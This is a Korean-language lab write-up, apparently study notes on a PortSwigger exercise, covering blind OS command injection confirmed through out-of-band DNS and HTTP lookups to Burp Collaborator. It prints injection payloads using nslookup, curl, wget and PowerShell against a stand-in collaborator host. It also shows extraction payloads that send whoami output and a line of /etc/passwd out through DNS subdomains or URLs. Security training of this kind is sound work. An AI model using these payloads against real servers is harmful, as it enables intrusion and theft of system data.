# Lab: Blind OS command injection with out-of-band interaction

## 개요

- **난이도**: Practitioner
- **주제**: OS Command Injection — Blind / OOB (Out-of-Band) / DNS 기반 탐지
- **링크**: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

## 목표

응답 지연도, 출력 리다이렉션도 사용할 수 없는 환경에서 DNS 조회를 외부 서버로 유발해 OS Command Injection 취약점이 존재함을 확인한다.

## 이전 랩들과의 차이

```
[001 — 즉시 출력]
  명령 결과가 응답에 반환
  → 직접 확인 가능

[002 — 시간 지연]
  sleep 으로 응답 지연 유발
  → 지연 시간으로 실행 여부 확인

[003 — 출력 리다이렉션]
  결과를 웹 접근 가능 경로에 파일 저장
  → URL 로 읽기
  → 웹 접근 가능 경로를 알아야 함

[004 (이번) — OOB]
  응답 없음 / 지연 없음 / 쓰기 경로 불명
  → 명령 실행 시 외부 서버로 DNS 조회 유발
  → 외부 서버(Burp Collaborator)에서 수신 확인
```

## OOB (Out-of-Band) 란

```
[In-Band]
  공격 채널 = 데이터 수신 채널
  예: HTTP 응답에 결과 반환

[Out-of-Band]
  공격 채널(HTTP)과 데이터 수신 채널(DNS/HTTP)이 별도
  예: 서버가 명령 실행 결과를 DNS 조회로 외부 서버에 전송

→ 응답에 어떠한 흔적도 남지 않아도 탐지 가능
→ 방화벽 내부에서 외부로 DNS/HTTP 아웃바운드가 허용되는 경우 유효
```

## 공격 원리

```
[공격자]                [취약한 서버]              [Burp Collaborator]
    │                        │                           │
    │── email=||nslookup X──▶│                           │
    │                        │── DNS 조회: X ────────────▶│
    │                        │                           │ 수신 기록
    │◀── HTTP 200 (결과 없음) │                           │
    │                        │                           │
    │                        ← Collaborator 에서 DNS 조회 확인
```

## Burp Collaborator

```
Burp Suite 의 외부 서버 서비스
  - 고유 서브도메인 제공: xxxx.oastify.com
  - DNS, HTTP, HTTPS, SMTP 인터랙션 수신 기록
  - Burp Suite Professional 에서 사용 가능

사용 방법:
  Burp Suite → Collaborator 탭 → Copy to clipboard
  → 페이로드에 xxxx.oastify.com 삽입
  → 공격 후 Poll now 클릭 → DNS 조회 수신 확인
```

## 공격 페이로드

```
email=x||nslookup+BURP-COLLABORATOR-SUBDOMAIN||
```

URL 인코딩:
```
email=x%7c%7cnslookup+xxxx.oastify.com%7c%7c
```

서버에서 실행:
```bash
process_feedback ... x||nslookup xxxx.oastify.com|| {subject} {message}
#  x → 실패
#  || → nslookup 실행
#  nslookup xxxx.oastify.com → DNS 조회 발생 → Collaborator 수신
#  || → 성공 시 뒤 실행 안 함
```

Burp Collaborator 에서 확인:
```
DNS query from SERVER-IP to xxxx.oastify.com
Type: A
```

## 플랫폼별 OOB DNS 페이로드

```bash
# Linux — nslookup
||nslookup+COLLABORATOR||

# Linux — curl (HTTP OOB)
||curl+http://COLLABORATOR||

# Linux — wget
||wget+http://COLLABORATOR||

# Windows — nslookup
||nslookup+COLLABORATOR||

# Windows — PowerShell
||powershell+-c+"Invoke-WebRequest+http://COLLABORATOR"||
```

## 대체 OOB 수신 도구

```
[Burp Collaborator] — Burp Suite Pro
  xxxx.oastify.com
  DNS/HTTP/HTTPS/SMTP 수신

[interactsh] — 오픈소스 (ProjectDiscovery)
  https://app.interactsh.com
  DNS/HTTP/HTTPS/SMTP 수신
  무료 사용 가능

[dnslog.cn] — DNS 전용
  xxxx.dnslog.cn
  단순 DNS 조회 확인

[RequestBin / Pipedream]
  HTTP/HTTPS 전용
  요청 내용 전체 확인 가능

[자체 서버]
  python3 -m http.server 80
  nc -lnvp 53 (DNS 포트, root 권한 필요)
```

## 데이터 추출까지 (다음 랩 005 미리보기)

이번 랩은 **존재 탐지**만 목표이지만, OOB 로 실제 데이터도 추출 가능:

```bash
# whoami 결과를 DNS 서브도메인에 포함
||nslookup+`whoami`.COLLABORATOR||
→ DNS 조회: peter-gBxxxx.xxxx.oastify.com

# /etc/passwd 일부 추출
||nslookup+`cat /etc/passwd | head -1 | base64`.COLLABORATOR||

# curl 로 HTTP 전송
||curl+http://COLLABORATOR/$(whoami)||
```

## 방화벽 환경에서의 OOB

```
[일반 환경]
  아웃바운드 HTTP, DNS 허용
  → curl, nslookup 모두 동작

[엄격한 방화벽]
  아웃바운드 HTTP 차단 / DNS만 허용
  → nslookup 사용

[완전 차단]
  DNS도 차단
  → OOB 불가
  → 시간 지연 방식으로 폴백

[내부 DNS 사용]
  외부 DNS 차단 / 내부 DNS만 허용
  → nslookup INTERNAL-HOST → 내부 DNS 서버에서 조회 기록 확인
```

## Blind OS Command Injection 탐지 전략 요약

```
1. 시간 지연 (sleep)
   → 가장 간단, 방화벽 영향 없음
   → 존재 여부만 확인 (데이터 추출 불가)

2. 출력 리다이렉션
   → 쓰기 가능 + 웹 접근 경로 필요
   → 경로를 알면 실제 데이터 추출 가능

3. OOB (DNS/HTTP) ← 이번 랩
   → 경로 불필요, 어떤 서버든 동작
   → 아웃바운드 허용 필요
   → 데이터 추출도 가능 (다음 랩)

[권장 순서]
  시간 지연 → OOB → 출력 리다이렉션
  (OOB 가 출력 리다이렉션보다 조건이 적음)
```

## 핵심 정리

- Blind OS Command Injection 에서 응답/지연/쓰기 경로가 모두 없을 때 OOB DNS 조회로 취약점 존재를 확인할 수 있다.
- `nslookup COLLABORATOR-DOMAIN` 을 주입하면 서버가 외부 DNS 서버에 조회를 보내고, Burp Collaborator 에서 수신을 확인한다.
- 페이로드 패턴 `||nslookup+DOMAIN||` 은 앞 명령 실패 시 nslookup 실행, 성공 후 뒤 인자 무시.
- OOB 채널은 DNS 뿐 아니라 HTTP/HTTPS 도 사용 가능하며, 실제 데이터를 서브도메인이나 URL 경로에 포함시켜 추출할 수도 있다.

## 배운 점

### Blind OS Command Injection 데이터 추출 방법 전체 비교

| 방법 | 필요 조건 | 데이터 추출 | 난이도 |
|------|----------|------------|--------|
| 즉시 출력 | 출력이 응답에 반영 | 가능 | 낮음 |
| 시간 지연 | 없음 | 불가 (존재 확인만) | 낮음 |
| 출력 리다이렉션 | 쓰기 가능 + 웹 경로 파악 | 가능 | 중간 |
| OOB DNS/HTTP | 아웃바운드 DNS/HTTP 허용 + 외부 서버 | 가능 (서브도메인 포함) | 중간 |
